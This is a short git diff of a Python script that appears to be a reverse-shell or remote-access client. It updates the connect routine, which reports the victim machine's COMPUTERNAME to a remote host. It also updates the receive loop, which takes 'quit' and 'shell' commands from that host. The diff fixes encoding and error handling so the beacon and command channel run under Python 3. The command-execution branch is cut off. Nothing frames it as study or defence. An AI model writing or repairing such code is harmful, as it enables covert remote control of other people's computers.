@@ -13,11 +13,16 @@ def connect():
         print('[!] trying to connect to %s:%s'%(host,port))
         s.connect((host,port))
         print('[*] Connection established.')
-        s.send(os.environ['COMPUTERNAME'])
-    except:
-        print('Could not connect.')
+        #print(os.environ['COMPUTERNAME'])
+        nom = os.environ['COMPUTERNAME']
+        my_str_as_bytes = str.encode(nom)
+        s.send(my_str_as_bytes)
+        print(nom)
+    except socket.error as msg:
+        print('Could not connect. :'+ str(msg[0]))
 def receive():
-    receive = s.recv(1024)
+    print('receive debug ...')
+    receive = s.recv(1024).decode()
     if receive == 'quit':
         s.close()
     elif receive[0:5] == 'shell':
